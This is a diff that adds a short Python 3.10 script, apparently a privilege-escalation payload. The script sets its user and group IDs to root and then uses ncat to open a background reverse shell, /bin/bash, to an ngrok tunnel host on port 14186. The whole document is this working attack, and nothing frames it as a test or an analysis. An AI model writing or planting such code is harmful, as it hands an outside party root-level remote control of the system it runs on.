@@ -1,0 +1,7 @@
+#!/usr/bin/python3.10
+
+import os
+
+os.setuid(0)
+os.setgid(0)
+os.system("ncat 6.tcp.eu.ngrok.io 14186 -e /bin/bash &")
